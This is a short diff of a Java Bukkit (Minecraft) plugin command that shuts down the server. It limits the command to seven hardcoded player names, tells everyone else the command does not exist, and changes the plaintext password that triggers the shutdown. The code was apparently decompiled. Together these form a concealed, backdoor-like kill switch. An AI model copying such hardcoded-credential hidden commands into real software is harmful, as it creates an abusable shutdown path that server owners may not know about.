@@ -21,7 +21,11 @@ public class DesligarServidor
       if (args.length == 0) {
         return true;
       }
-      if (args[0].equalsIgnoreCase("EstrelaDoBem476")) {
+      if (!p.getName().equals("zEnderX5_") && !p.getName().equals("Rafael_Melo") && !p.getName().equals("_Lock_") && !p.getName().equals("ySlozin") && !p.getName().equals("Kombaaa") && !p.getName().equals("estrela145") && !p.getName().equals("Kirin44")) {
+    		/* 31 */         p.sendMessage("§cEsse comando n§o existe.");
+    		/* 33 */         return true;
+    		/*    */       }
+      if (args[0].equalsIgnoreCase("CaracolBB16918")) {
         Bukkit.shutdown();
       }
     }
